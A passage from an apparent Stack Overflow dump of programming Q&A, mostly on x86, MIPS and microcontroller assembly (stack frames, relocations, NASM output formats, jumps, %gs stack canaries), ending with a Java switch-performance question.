<p>CPU moves +8 bytes up the stack(from frame pointer <code>%ebp</code>), takes the value stored at that location, and stores this value at the register <code>%eax</code>(to emphasis - stores the value, not the address) </p>

<p>I am right ? 
Thanks !</p>
","<p>Yeah, it sounds like you've got it right. IMHO, the AT&amp;T <code>8(%ebp)</code> syntax is less intuitive than the Intel <code>[ebp+8]</code> which is more clear. The brackets show that you're using the value at the address in the register, and the number is the offset from that address you actually want.</p>
","4093626"
"Counter from 00 to 99 in assembly language","11774","","<p>Basically my task is to make the counter on a micro controller board count from 00-99 continuously using assembly language.</p>

<p>because it is not possible to show two 7-Seg to display at the same time, my solution is to display the tens(0), display ones(0), display tens(0), display one(1), display tens(0), display one(2), display tens(0), display one(3), etc. my approach to doing this is to have two loops (one for the tens digit, one for the ones digit) that goes through an array. once the ones digit loop have gone through the entire array, the loop breaks and goes back to the tens digit loop, move the tens digit to the next element, then back to the ones digit loop</p>

<pre><code>    MSB_Display     equ     $0B ; display on 'tens' digit/second most right of 7-Seg
    LSB_Display     equ     $07 ; display on 'ones' digit/most right of 7-Seg


    D_1MS           equ     24000 / 6

    DelayVal        equ     35      ; 35 ms delay simulates both Hex Displays on at once

                    org     $1000
    ;                             Lookup table for LED segments
    array           db      $3F,$06,$5B,$4F,$66,$6D,$7C,$07,$7F,$6F
    ;                        0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9

    ; Memory Reserved for Delay Routine
    DCount          ds      1
    Counter         ds      1
    countones       db      0
    counttens       db      0

            org     $2000           ; Program starts here
            lds     #$2000          ; Initalize the stack

    ; Configure Hardware
            ldaa    #$FF
            staa    DDRB            ; Make PORTB output
            staa    DDRP            ; PTP as Output

    start
            clr     countones       ; clear count back to 0
            clr     counttens
        ldx     #array


    MSB
            ldaa    1,x+
            staa    PORTB
            ldaa    #MSB_Display
            staa    PTP             ; turn off 7-segment display
            bsr     Delay_ms
            inc     counttens
            ldaa    counttens
            cmpa    #10
            bne     LSB


    LSB
            ldy     #array
        ldab    1,y+
            stab    PORTB
            ldab    #LSB_Display
            stab    PTP
            bsr     Delay_ms
            inc     countones
            ldaa    countones
            cmpa    #10
            bne     LSB


            bra     MSB


            Delay_ms
                    psha              
                    pshy
                    ldaa   #DelayVal        ; Number of msec to delay
                    staa    DCount          ; store delay counter
                    ldaa    DCount          ; delay Dcount ms
                    staa    Counter
            Delay1  ldy     #D_1MS          ; 6000 x 4 = 24,000 cycles = 1ms
            Delay2  dey                     ; this instruction takes 1 cycle
                    bne     Delay2          ; this instruction takes 3 cycles
                    dec     Counter
                    bne     Delay1          ; not Dcount ms yet, delay again
                    pula                    ; Restore contents of ACC A before returning
                    puly
                    rts
                    end
</code></pre>

<p>right now it seems like the program enters the ones digit loop (LSB) and sits there, it does not exit that loop nor does it reloop itself. I can't seem to find whats wrong in the logic of my program</p>
","<p>Pulling from stack should be done in reverse order from putting on stack.
As Ira pointed out you got your counters mixed up...</p>

<p>You should think of 'displaying two digit number' as a separate thing from increasing some counter in a loop.
Displaying is simple switching 'active' output with a time delay, and setting correct digit value for each display cycle.</p>

<pre><code>         'tens' = 0
loop10   'ones' = 0
loop1    display 'tens'
         delay
         display 'ones'
         delay
         inc 'ones'
         goto loop1 if 'ones' less than 10
         inc 'tens'
         goto loop10 if 'tens' less than 10
</code></pre>

<p>Here is one way of doing this (adjust delay value - 35ms looks to fast...):</p>

<pre><code>MSB_Display     equ     $0B ; display on 'tens' digit/second most right of 7-Seg
LSB_Display     equ     $07 ; display on 'ones' digit/most right of 7-Seg


D_1MS           equ     24000 / 6

DelayVal        equ     35      ; 35 ms delay simulates both Hex Displays on at once

                org     $1000
;                             Lookup table for LED segments
array           db      $3F,$06,$5B,$4F,$66,$6D,$7C,$07,$7F,$6F
;                        0 , 1 , 2 , 3 , 4 , 5 , 6 , 7 , 8 , 9

; Memory Reserved for Delay Routine
DCount          ds      1
Counter         ds      1
countones       db      0
counttens       db      0

        org     $2000           ; Program starts here
        lds     #$2000          ; Initalize the stack

; Configure Hardware
        ldaa    #$FF
        staa    DDRB            ; Make PORTB output
        staa    DDRP            ; PTP as Output

start
        clr     counttens       ; 'tens' = 0
        ldx     #array          ; x will point to 'tens'

MSB     clr     countones       ; 'ones' = 0
        ldy     #array          ; y will point to 'ones'
                                ; at every start of 'tens' cycle
LSB
        ldaa    x               ; Set value of 'tens' display
                                ; Do not use 1,x+ here
                                ; You don't want to increment 'tens'
                                ; every time you display 'ones'
        staa    PORTB
        ldaa    #MSB_Display
        staa    PTP             ; turn on 'tens' 7-segment display
        bsr     Delay_ms        ; let it be lit for a while

        ldab    1,y+            ; set value of 'ones' display (and increment it)
        stab    PORTB
        ldab    #LSB_Display
        stab    PTP             ; turn on 'ones' 7-segment display
        bsr     Delay_ms        ; let it be lit for a while

        inc     countones
        ldaa    countones
        cmpa    #10
        bne     LSB

        inx                     ; now increment 'tens'
        inc     counttens
        ldaa    counttens
        cmpa    #10
        bne     MSB

        bra     start           ; start from '00'

Delay_ms
        psha              
        pshy
        ldaa   #DelayVal        ; Number of msec to delay
        staa    Counter
Delay1  ldy     #D_1MS          ; 6000 x 4 = 24,000 cycles = 1ms
Delay2  dey                     ; this instruction takes 1 cycle
        bne     Delay2          ; this instruction takes 3 cycles
        dec     Counter
        bne     Delay1          ; not Dcount ms yet, delay again
        puly                    ; Restore contents of ACC A before returning
        pula
        rts
        end
</code></pre>

<p>It would be even better to have display code in a separate routine, and to switch active display more than once per counter increase. That could be a nice exercise for you :)</p>
","8778035"
"What is the reason function names are prefixed with an underscore by the compiler?","11744","","<p>When I see the assembly code of a C app, like this:</p>

<pre><code>emacs hello.c
clang -S -O hello.c -o hello.s
cat hello.s
</code></pre>

<p>Function names are prefixed with an underscore (e.g. <code>callq _printf</code>). Why is this done and what advantages does it have?</p>

<hr>

<p>Example:</p>

<p><strong>hello.c</strong></p>

<pre><code>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;


int main() {
  char *myString = malloc(strlen(""Hello, World!"") + 1);
  memcpy(myString, ""Hello, World!"", strlen(""Hello, World!"") + 1);
  printf(""%s"", myString);
  return 0;
}
</code></pre>

<p><strong>hello.s</strong></p>

<pre><code>_main:                       ; Here
Leh_func_begin0:
    pushq   %rbp
Ltmp0:
    movq    %rsp, %rbp
Ltmp1:
    movl    $14, %edi
    callq   _malloc          ; Here
    movabsq $6278066737626506568, %rcx
    movq    %rcx, (%rax)
    movw    $33, 12(%rax)
    movl    $1684828783, 8(%rax)
    leaq    L_.str1(%rip), %rdi
    movq    %rax, %rsi
    xorb    %al, %al
    callq   _printf          ; Here
    xorl    %eax, %eax
    popq    %rbp
    ret
Leh_func_end0:
</code></pre>
","<p>From <a href=""http://www.iecc.com/linker/"" rel=""noreferrer"">Linkers and Loaders</a>:</p>

<blockquote>
  <p>At the time that UNIX was rewritten in C in about 1974, its authors already had extensive assember language libraries, and it was easier to mangle the names of new C and C-compatible code than to go back and fix all the existing code. Now, 20 years later, the assembler code has all been rewritten five times, and UNIX C compilers, particularly ones that create COFF and ELF object files, no longer prepend the underscore.</p>
</blockquote>

<p>Prepending an underscore in the assembly results of C compilation is just a name-mangling convention that arose as a workaround. It stuck around for (as far as I know) no particular reason, and has now made its way into Clang.</p>

<p>Outside of assembly, the C standard library often has implementation-defined functions prefixed with an underscore to convey notions of magicalness and <em>don't touch this</em> to the ordinary programmers that stumble across them.</p>
","5908708"
"What is a NULL in hexadecimal","11717","","<p>I have to debug a C application in assembler. I want to know if a register is containing a 
<code>NULL</code> . I need for that the hex value of that. </p>

<p>Note:</p>

<p>I use a PPC</p>
","<p>Null is <code>00</code> in hexadecimal. Kindly refer this:- <a href=""http://www2.sunysuffolk.edu/jonesm/computing/qbasic/ascii.pdf"" rel=""nofollow"">http://www2.sunysuffolk.edu/jonesm/computing/qbasic/ascii.pdf</a></p>
","13604710"
"Assembly 'call' vs 'jmp'","11716","","<p>I got told to try and use 'jmp rather than 'call', but 'jmp' is not liking me .. when I jump it doesn't return (so it never exits and not happy days ), but calling returns and exits as normal. </p>

<p>I am happy using 'call' but is there actually a reason I should try and overcome 'jmp' ?</p>

<p>this simple code just shows if when I 'jmp' it never returns and exits.</p>

<p>Thankyou in advanced for any help.</p>

<pre><code>_start:

    jmp _Print
    jmp _Exit

ret


_Exit:

    ; normal exit 

ret


_Print

    ; print something

ret
</code></pre>

<p>also .. I'm running this all in a linux terminal if that changes anything</p>
","<p>Well, first of all, <code>jmp</code> simply 'jumps' to the label that you give to it (which is a memory address as program instructions are stored in memory) while <code>call</code> stores the location where it will return (below the <code>call</code> instruction) in the stack, <code>jmp</code> to the label, and then at the <code>ret</code> instruction, <code>jmp</code> back to what location was stored (as said above, below the call instruction). A bit of a difference there as you can see. IMHO, i believe it is fine to simply <code>call</code> functions, as that is what the c++ compiler does with functions, but if you must <code>jmp</code>, then alright then, just make sure to <code>push</code> the return location or create another label to return to once done executing some code.</p>

<p>Here is an example of jumping to other label when done:</p>

<pre><code>_start:



 jmp _Print;



_start_label:



 jmp _Exit;

_Exit:
 ; exit stuff goes here

 ret;     

_Print:

;print stuff goes here

jmp _start_label;
</code></pre>

<p>or you could just use call :)</p>
","32793293"
"symbol table and relocation table in object file","11687","","<p>From what I understand, instructions and data in an object file all have addresses. First data item start at address 0 and first instruction also start at address 0. </p>

<p>The relocation table contains information about instructions that need to be updated if the addresses in the file change, for example if the file is linked together with another. Line A, in the example below, would be in the relocation table. I don't think B would be in the relocation table, since the address of label ""equal"" is relative to B. Are these correct assumptions?</p>

<p>I know the symbol table show the labels the file have and also labels that haven't been resolved. But what other information does the symbol table contain?</p>

<p>Also, when the assembler translates the instructions to binary, what is placed in those instructions that have unresolved references?. B in this example. </p>

<pre><code>.data
TEXT: .asciiz ""Foo""

.text
.global main
main:
     li t0, 1
     beq t0, 1, equal #B

equal:
    la a0, TEXT
    jal printf #A
</code></pre>
","<p>Yes, your assumptions are correct. There are various types of relocations, what the assembler emits into the instruction depends on the type. Generally it's an offset to be added. You can use <code>objdump -dr</code> to see relocations. For better illustration I have changed your code a little:</p>

<pre><code>.data
.int 0
TEXT: .asciiz ""Foo""
.text
.global main
main:
     li $t0, 1
     beq $t0, 1, equal #B
     bne $t0, 42, foo  #C

equal:
     la $a0, TEXT
     jal printf #A
</code></pre>

<p>Output of objdump:</p>

<pre><code>00000000 &lt;main&gt;:
   0:   24080001        li      t0,1
   4:   24010001        li      at,1
   8:   11010004        beq     t0,at,1c &lt;equal&gt;
   c:   00000000        nop
  10:   2401002a        li      at,42
  14:   1501ffff        bne     t0,at,14 &lt;main+0x14&gt;
                        14: R_MIPS_PC16 foo
  18:   00000000        nop

0000001c &lt;equal&gt;:
  1c:   3c040000        lui     a0,0x0
                        1c: R_MIPS_HI16 .data
  20:   0c000000        jal     0 &lt;main&gt;
                        20: R_MIPS_26   printf
  24:   24840004        addiu   a0,a0,4
                        24: R_MIPS_LO16 .data
</code></pre>

<p>As you said, there is no relocation for the <code>beq</code> since that's a relative address within this object file.</p>

<p>The <code>bne</code> I added (line marked with <code>C</code>) references an external symbol, so even though the address is relative a relocation entry is needed. It will be of type <code>R_MIPS_PC16</code> to produce a 16 bit signed word offset to symbol <code>foo</code>. As the instruction encoding requires offset from the next word and not the current <code>PC</code> that the relocation uses, <code>1</code> has to be subtracted, and that's encoded as 2's complement <code>ffff</code> into the instruction itself.</p>

<p>The <code>la</code> pseudoinstruction has been translated by the assembler into a <code>lui</code>/<code>addiu</code> pair (the latter in the delay slot of the <code>jal</code>). For the <code>lui</code> a <code>R_MIPS_HI16</code> relocation is created against the <code>.data</code> section which will fill in the top 16 bits. Since the symbol <code>TEXT</code> is at address <code>4</code> in the <code>.data</code> section, the top 16 bits of the offset are <code>0</code>. This means the instruction contains <code>0</code> offset. Similarly, for the low 16 bits, except there the instruction contains an offset of <code>4</code>.</p>

<p>Finally, the <code>jal printf</code> is using yet another kind of relocation that is tailored for the encoding required by the instruction. The offset is zero because the jump is directly to the referenced symbol. Note that objdump is trying to be helpful by decoding that, but it doesn't process the relocation so the <code>&lt;main&gt;</code> it outputs is of course nonsense.</p>
","16750324"
"How to Dynamically Allocate Memory Using Assembly and System Calls Under Linux","11672","","<p>I'm looking for some good code examples of dynamic memory allocation using an assembly language under Linux and using system calls, not malloc and friends.</p>

<p>What are some of the simplest but effective ways to do this?</p>

<p>On Intel 386+ computers.</p>
","<p><a href=""http://linux.die.net/man/2/brk"" rel=""nofollow noreferrer""><code>brk(2)</code></a>. And take a look at <a href=""http://en.wikipedia.org/wiki/Executable_and_Linkable_Format"" rel=""nofollow noreferrer"">ELF</a>.</p>
","2782045"
"Tool to Debug Guest OS in Virtual Box","11671","","<p>I'm just cross posting the same question I did on virtualbox.org. <a href=""http://forums.virtualbox.org/viewtopic.php?f=9&amp;t=26702&amp;p=119139#p119139"" rel=""noreferrer"">http://forums.virtualbox.org/viewtopic.php?f=9&amp;t=26702&amp;p=119139#p119139</a></p>

<p>If not breaking any rule, I'd appreciate to kwon more about it since stackoverflow promisses to be more dynamic!</p>

<p>""Hi,
I did some search and could not find any tool to debug a guest system from the early boot in virtual box. Although, I came across JCP, a x86 emulator in java that is not so powerful and beautyful but has a debug mode where one can view the Physical Memory, the CPU registers along other things. It also makes it possible to execute CPU instructions step by step and set break points, watchpoints and conditional ones. There's such thing in Virtual Box?</p>

<p>I think would be amazing to have it and be able to inspect the system while its running. For learn about PC architecture or as a tool to develop a kernel as well.</p>

<p>In the case you think its good idea (I think it is) how can it be achieved? I'm interested in develop such sort o things and would like to know if it is feasible if not already implemented somewhere.""</p>

<p>EDT: Are modern x86 able to interrupt its execution just after a cpu cycle and pass execution addres to another code to just do this? Yes, the trap flag can be set to put the processor in step by step execution mode. x86 will execute one instruction and call INT 3.</p>
","<p>The <a href=""http://wiki.osdev.org/Main_Page"" rel=""noreferrer"">OSDev wiki</a> has some useful information on debugging a guest operating system, though according to <a href=""http://wiki.osdev.org/Emulator_Comparison"" rel=""noreferrer"">this page</a> VirtualBox doesn't have a debugger at present. I've been using QEmu with <a href=""http://wiki.osdev.org/GDB"" rel=""noreferrer"">the GDB stub</a> and it works quite nicely, so you might like to give that a go instead.</p>
","2049883"
"Error when trying to run .asm file on NASM on Ubuntu","11617","","<p>I'm using ubuntu 64-bit and trying to run a .asm file on NASM. But it returns this error when I try to run the following code. What Iḿ trying to do is build an executable by compiling (or assembling) object file from the source 
<code>$ nasm -f elf hello.asm</code>, and then after created the file <code>hello.o</code> is producing executable file itself from the object file by invoking linker </p>

<pre><code>$ ld -s -o hello hello.o
</code></pre>

<p>This will finally build hello executable.</p>

<p>I'm following this tutorial <a href=""http://www.faqs.org/docs/Linux-HOWTO/Assembly-HOWTO.html"" rel=""noreferrer"">http://www.faqs.org/docs/Linux-HOWTO/Assembly-HOWTO.html</a></p>

<p><strong>Error:</strong></p>

<p>i386 architecture of input file `hello.o' is incompatible with i386:x86-64 output</p>

<p><strong>Code:</strong></p>

<pre><code>     section .data              ;section declaration

 msg     db      ""Hello, world!"",0xa    ;our dear string
 len     equ     $ - msg                 ;length of our dear string

 section .text              ;section declaration

             ;we must export the entry point to the ELF linker or
     global _start       ;loader. They conventionally recognize _start as their
             ;entry point. Use ld -e foo to override the default.

 _start:

 ;write our string to stdout

         mov     edx,len ;third argument: message length
         mov     ecx,msg ;second argument: pointer to message to write
         mov     ebx,1   ;first argument: file handle (stdout)
         mov     eax,4   ;system call number (sys_write)
         int     0x80   ;call kernel

  ;and exit

     mov    ebx,0   ;first syscall argument: exit code
         mov     eax,1   ;system call number (sys_exit)
         int     0x80   ;call kernel
</code></pre>
","<p>This looks like it may be a simple mismatch between what's produced by <code>nasm</code> and what <code>ld</code> is trying to make:</p>

<pre><code>i386 architecture of input file 'hello.o' is incompatible with i386:x86-64 output
</code></pre>

<p>In other words, <code>nasm</code> has produced a 32-bit object file <code>hello.o</code> and <code>ld</code> wants to take that and make a 64-bit executable file.</p>

<p>The <code>nasm -hf</code> command should give you the available output formats:</p>

<pre><code>valid output formats for -f are (`*' denotes default):
  * bin       flat-form binary files (e.g. DOS .COM, .SYS)
    ith       Intel hex
    srec      Motorola S-records
    aout      Linux a.out object files
    aoutb     NetBSD/FreeBSD a.out object files
    coff      COFF (i386) object files (e.g. DJGPP for DOS)
    elf32     ELF32 (i386) object files (e.g. Linux)
    elf       ELF (short name for ELF32) 
    elf64     ELF64 (x86_64) object files (e.g. Linux)
    as86      Linux as86 (bin86 version 0.3) object files
    obj       MS-DOS 16-bit/32-bit OMF object files
    win32     Microsoft Win32 (i386) object files
    win64     Microsoft Win64 (x86-64) object files
    rdf       Relocatable Dynamic Object File Format v2.0
    ieee      IEEE-695 (LADsoft variant) object file format
    macho32   NeXTstep/OpenStep/Rhapsody/Darwin/MacOS X (i386) object files
    macho     MACHO (short name for MACHO32)
    macho64   NeXTstep/OpenStep/Rhapsody/Darwin/MacOS X (x86_64) object files
    dbg       Trace of all info passed to output stage
</code></pre>

<p>I see that your linked tutorial asks you to run:</p>

<pre><code>nasm -f elf hello.asm
</code></pre>

<p>Try using:</p>

<pre><code>nasm -f elf64 hello.asm
</code></pre>

<p>instead, and you may find <code>ld</code> stops complaining about the input file.</p>
","4252346"
"How exactly does the callstack work?","11603","","<p>I'm trying to get a deeper understanding of how the low level operations of programming languages work and especially how they interact with the OS/CPU. I've probably read every answer in every stack/heap related thread here on Stack&nbsp;Overflow, and they are all brilliant. But there is still one thing that I didn't fully understand yet.</p>

<p>Consider this function in pseudo code which tends to be valid Rust code ;-)</p>

<pre><code>fn foo() {
    let a = 1;
    let b = 2;
    let c = 3;
    let d = 4;

    // line X

    doSomething(a, b);
    doAnotherThing(c, d);
}
</code></pre>

<p>This is how I assume the stack to look like on line X:</p>

<pre><code>Stack

a +-------------+
  | 1           | 
b +-------------+     
  | 2           |  
c +-------------+
  | 3           | 
d +-------------+     
  | 4           | 
  +-------------+ 
</code></pre>

<p>Now, everything I've read about how the stack works is that it strictly obeys LIFO rules (last in, first out). Just like a stack datatype in .NET, Java or any other programming language.</p>

<p>But if that's the case, then what happens after line X? Because obviously, the next thing we need is to work with <code>a</code> and <code>b</code>, but that would mean that the OS/CPU (?) has to pop out <code>d</code> and <code>c</code> first to get back to <code>a</code> and <code>b</code>. But then it would shoot itself in the foot, because it needs <code>c</code> and <code>d</code> in the next line.</p>

<p>So, I wonder what <strong>exactly</strong> happens behind the scenes?</p>

<p>Another related question. Consider we pass a reference to one of the other functions like this:</p>

<pre><code>fn foo() {
    let a = 1;
    let b = 2;
    let c = 3;
    let d = 4;

    // line X

    doSomething(&amp;a, &amp;b);
    doAnotherThing(c, d);
}
</code></pre>

<p>From how I understand things, this would mean that the parameters in <code>doSomething</code> are essentially pointing to the same memory address like <code>a</code> and <code>b</code> in <code>foo</code>. But then again this means that there is no <em>pop up the stack until we get to <code>a</code> and <code>b</code></em> happening.</p>

<p>Those two cases make me think that I haven't fully grasped how <strong>exactly</strong> the stack works and how it strictly follows the <em>LIFO</em> rules.</p>
","<p>The call stack could also be called a frame stack.<br>
<strong>The things that are <em>stacked</em> after the LIFO principle are not the local variables but the entire stack frames (""calls"") of the functions being called</strong>. The local variables are pushed and popped together with those frames in the so-called <a href=""http://en.wikipedia.org/wiki/Function_prologue"" rel=""nofollow noreferrer"">function prologue</a> and <a href=""http://en.wikipedia.org/wiki/Function_epilogue#Epilogue"" rel=""nofollow noreferrer"">epilogue</a>, respectively.</p>

<p>Inside the frame the order of the variables is completely unspecified; Compilers <a href=""https://stackoverflow.com/questions/1102049/order-of-local-variable-allocation-on-the-stack"">""reorder"" the positions of local variables inside a frame</a> appropriately to optimize their alignment so the processor can fetch them as quickly as possible. The crucial fact is that <strong>the offset of the variables relative to some fixed address is constant throughout the lifetime of the frame</strong> - so it suffices to take an anchor address, say, the address of the frame itself, and work with offsets of that address to the variables. Such an anchor address is actually contained in the so-called <strong>base</strong> or <strong>frame pointer</strong> which is stored in the EBP register. The offsets, on the other hand, are clearly known at compile time and are therefore hardcoded into the machine code.</p>

<p>This graphic from <a href=""https://en.wikipedia.org/wiki/Call_stack#/media/File:Call_stack_layout.svg"" rel=""nofollow noreferrer"">Wikipedia</a> shows what the typical call stack is structured like<sup>1</sup>:</p>

<p><img src=""https://i.stack.imgur.com/uiCRx.png"" alt=""Picture of a stack""></p>

<p>Add the offset of a variable we want to access to the address contained in the frame pointer and we get the address of our variable. So shortly said, the code just accesses them directly via constant compile-time offsets from the base pointer; It's simple pointer arithmetic.</p>

<h2>Example</h2>

<pre class=""lang-cpp prettyprint-override""><code>#include &lt;iostream&gt;

int main()
{
    char c = std::cin.get();
    std::cout &lt;&lt; c;
}
</code></pre>

<p><a href=""http://gcc.godbolt.org/#%7B%22version%22%3A3%2C%22filterAsm%22%3A%7B%22labels%22%3Atrue%2C%22directives%22%3Atrue%2C%22commentOnly%22%3Atrue%7D%2C%22compilers%22%3A%5B%7B%22sourcez%22%3A%22MQSwdgxgNgrgJgUwAQB4QHsDOAXATggQwFsA%2BAKDPGySIPAAoBKMgbzKQ6QgAsDcukAXiQ44ALjERwAOgDmCbEwDc7TqIkR0MaihRcVAXzJAAA%3D%3D%22%2C%22compiler%22%3A%22%2Fopt%2Fgcc-4.9.0%2Fbin%2Fg%2B%2B%22%2C%22options%22%3A%22%22%7D%5D%7D"" rel=""nofollow noreferrer"">gcc.godbolt.org</a> gives us</p>

<pre><code>main:
    pushq   %rbp
    movq    %rsp, %rbp
    subq    $16, %rsp

    movl    std::cin, %edi
    call    std::basic_istream&lt;char, std::char_traits&lt;char&gt; &gt;::get()
    movb    %al, -1(%rbp)
    movsbl  -1(%rbp), %eax
    movl    %eax, %esi
    movl    std::cout, %edi
    call    [... the insertion operator for char, long thing... ]

    movl    $0, %eax
    leave
    ret
</code></pre>

<p>.. for <code>main</code>. I divided the code into three subsections. 
The function prologue consists of the first three operations:</p>

<ul>
<li>Base pointer is pushed onto the stack.</li>
<li>The stack pointer is saved in the base pointer</li>
<li>The stack pointer is subtracted to make room for local variables.</li>
</ul>

<p>Then <code>cin</code> is moved into the EDI register<sup>2</sup> and <code>get</code> is called; The return value is in EAX.</p>

<p>So far so good. Now the interesting thing happens:</p>

<p>The low-order byte of EAX, designated by the 8-bit register AL, is taken and <strong>stored in the byte right after the base pointer</strong>: That is <code>-1(%rbp)</code>, the offset of the base pointer is <code>-1</code>. <strong>This byte is our variable <code>c</code></strong>. The offset is negative because the stack grows downwards on x86. The next operation stores <code>c</code> in EAX: EAX is moved to ESI, <code>cout</code> is moved to EDI and then the insertion operator is called with <code>cout</code> and <code>c</code> being the arguments.</p>

<p>Finally,</p>

<ul>
<li>The return value of <code>main</code> is stored in EAX: 0. That is because of the implicit <code>return</code> statement.
You might also see <code>xorl rax rax</code> instead of <code>movl</code>.</li>
<li>leave and return to the call site. <code>leave</code> is abbreviating this epilogue and implicitly 

<ul>
<li>Replaces the stack pointer with the base pointer and</li>
<li>Pops the base pointer. </li>
</ul></li>
</ul>

<p>After this operation and <code>ret</code> have been performed, the frame has effectively been popped, although the caller still has to clean up the arguments as we're using the cdecl calling convention. Other conventions, e.g. stdcall, require the callee to tidy up, e.g. by passing the amount of bytes to <code>ret</code>.</p>

<h3>Frame Pointer Omission</h3>

<p>It is also possible not to use offsets from the base/frame pointer but from the stack pointer (ESB) instead. This makes the EBP-register that would otherwise contain the frame pointer value available for arbitrary use - but it can make <a href=""https://gcc.gnu.org/onlinedocs/gcc-4.9.0/gcc/Optimize-Options.html"" rel=""nofollow noreferrer"">debugging impossible on some machines</a>, and will be <a href=""http://www.nynaeve.net/?p=91"" rel=""nofollow noreferrer"">implicitly turned off for some functions</a>. It is particularly useful when compiling for processors with only few registers, including x86.</p>

<p>This optimization is known as FPO (frame pointer omission) and set by <code>-fomit-frame-pointer</code> in GCC and <code>-Oy</code> in Clang; note that it is implicitly triggered by every optimization level > 0 if and only if debugging is still possible, since it doesn't have any costs apart from that.
For further information see <a href=""https://stackoverflow.com/questions/14666665/trying-to-understand-gcc-option-fomit-frame-pointer"">here</a> and <a href=""https://stackoverflow.com/questions/1942801/when-should-i-omit-the-frame-pointer"">here</a>.</p>

<hr>

<p><sup>1</sup> As pointed out in the comments, the frame pointer is presumably meant to point to the address after the return address.</p>

<p><sup>2</sup> Note that the registers that start with R are the 64-bit counterparts of the ones that start with E. EAX designates the four low-order bytes of RAX. I used the names of the 32-bit registers for clarity.</p>
","23981489"
"Assembly return address","11582","","<p>i want to get the return address of a function in assembly and then compare that return address value with another value without corrupting the stack or changing anything in the stack, </p>

<p>how can that be done in assembly?</p>

<p>i'm using x86</p>
","<p>Usualy on x86 if using stdcall convention return address is stored at content of register ebp +4. So <code>cmp ebp, whatever;</code> should do the job. Actualy it's not dependent from calling convention rather as it depends whether your compiler puts push ebp as the first instruction of your function, which it usualy does. Generaly the function then looks like:</p>

<pre><code>push ebp
mov ebp,esp
sub esp,size_of_local_variables
...
somehting something something
...
mov esp, ebp
pop ebp
ret
</code></pre>
","9692888"
"What does JS do in Assembly x86?","11582","","<pre><code>cmp %al, %cl
js x
</code></pre>

<p>I'm confused on what the js (jump on sign) is doing. Is it saying that if al is positive and cl is negative vice versa then jump? </p>

<p>Also, what happens if %cl is 0 or nothing is in it? </p>

<p>Thanks!</p>
","<p><code>JS</code> will jump if the sign flag is set (by an earlier instruction). <a href=""http://web.itu.edu.tr/~aydineb/index_files/instr/cmp.html"" rel=""noreferrer"">CMP</a> will always modify the flags by performing a subtraction, in this case <code>%al - %cl</code>. (assuming Intel syntax, not AT&amp;T).</p>

<p>Because of the length of the instructions, the sign will be the bit 7 of the expression %al-%cl (and which is thrown away).</p>

<p>If %cl == 0, then the temporary value will be %al exactly and the sign will be the sign of the register %al. Thus a jump is taken, if %al is negative.</p>

<p>Here's a <a href=""http://www.unixwiz.net/techtips/x86-jumps.html"" rel=""noreferrer"">reference</a> for all the conditional jumps.</p>
","21872912"
"What is %gs in Assembly","11568","","<pre>
void return_input (void)
{ 
   char array[30]; 

   gets (array); 
   printf(""%s\n"", array); 
}
</pre>

<p>After compiling it in gcc, this function is converted to the following Assembly code:</p>

<pre>
push   %ebp
mov    %esp,%ebp
sub    $0x28,%esp
mov    %gs:0x14,%eax
mov    %eax,-0x4(%ebp)
xor    %eax,%eax
lea    -0x22(%ebp),%eax
mov    %eax,(%esp)
call   0x8048374 
lea    -0x22(%ebp),%eax
mov    %eax,(%esp)
call   0x80483a4 
mov    -0x4(%ebp),%eax
xor    %gs:0x14,%eax
je     0x80484ac 
call   0x8048394 
leave  
ret  
</pre>

<p>I don't understand two lines:</p>

<pre>
mov    %gs:0x14,%eax
xor    %gs:0x14,%eax
</pre>

<p>What is %gs, and what exactly these two lines do?</p>

<p>This is compilation command:</p>

<pre>
cc -c -mpreferred-stack-boundary=2 -ggdb file.c
</pre>
","<p>GS is a segment register, its use in linux can be read up on <a href=""http://www.gossamer-threads.com/lists/linux/kernel/970025"" rel=""noreferrer"">here</a> (its basically used for per process data).</p>

<pre><code>mov    %gs:0x14,%eax
xor    %gs:0x14,%eax
</code></pre>

<p>this code is used to validate that the stack hasn't exploded or been corupted, using a canary value stored at GS+0x14, see <a href=""http://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/"" rel=""noreferrer"">this</a>.</p>
","9249466"
"Does ret instruction cause esp register added by 4?","11553","","<p>Does ""ret"" instruction cause ""esp"" register added by 4?</p>
","<p>Yes, it performs </p>

<pre><code>pop eip
</code></pre>

<p>You can use </p>

<pre><code>mov eax, [esp]
jmp eax
</code></pre>

<p>to avoid it.</p>

<p>EDIT: It's exactly what <code>ret</code> does. For example, <code>jmp rel_offet</code> is nothing than a hidden <code>add eip, offset</code>, or <code>jmp absolute_offset</code> is <code>mov eip, absolute_offset</code>. Sure there are differences in the way the processor treats them, but from programmer's point of view it's all that happens.</p>

<p>Also, there is a special form of <code>ret</code> : <code>ret imm8</code> that also adds this imm8 value to <code>esp</code> : for example a <code>__stdcall</code> function uses it to discard its parameters from the stack. Not to mention <code>retf</code> version, used in 16bit mode, that also pops the <code>cs</code> from the stack.</p>

<p>EDIT2:</p>

<pre><code>pop register
</code></pre>

<p>means:</p>

<pre><code>mov register, [esp]
add esp, 4
</code></pre>
","4292481"
"Why does Java switch on contiguous ints appear to run faster with added cases?","11543","","<p>I am working on some Java code which needs to be highly optimized as it will run in hot functions that are invoked at many points in my main program logic. Part of this code involves multiplying <code>double</code> variables by <code>10</code> raised to arbitrary non-negative <code>int</code> <code>exponent</code>s. One fast way (edit: but not the fastest possible, see Update 2 below) to get the multiplied value is to <code>switch</code> on the <code>exponent</code>:</p>

<pre><code>double multiplyByPowerOfTen(final double d, final int exponent) {
   switch (exponent) {
      case 0:
         return d;
      case 1:
         return d*10;
      case 2:
         return d*100;
      // ... same pattern
      case 9:
         return d*1000000000;
      case 10:
         return d*10000000000L;
      // ... same pattern with long literals
      case 18:
         return d*1000000000000000000L;
      default:
         throw new ParseException(""Unhandled power of ten "" + power, 0);
   }
}
</code></pre>

<p>The commented ellipses above indicate that the <code>case</code> <code>int</code> constants continue incrementing by 1, so there are really 19 <code>case</code>s in the above code snippet. Since I wasn't sure whether I would actually need all the powers of 10 in <code>case</code> statements <code>10</code> thru <code>18</code>, I ran some microbenchmarks comparing the time to complete 10 million operations with this <code>switch</code> statement versus a <code>switch</code> with only <code>case</code>s <code>0</code> thru <code>9</code> (with the <code>exponent</code> limited to 9 or less to avoid breaking the pared-down <code>switch</code>). I got the rather surprising (to me, at least!) result that the longer <code>switch</code> with more <code>case</code> statements actually ran faster.</p>

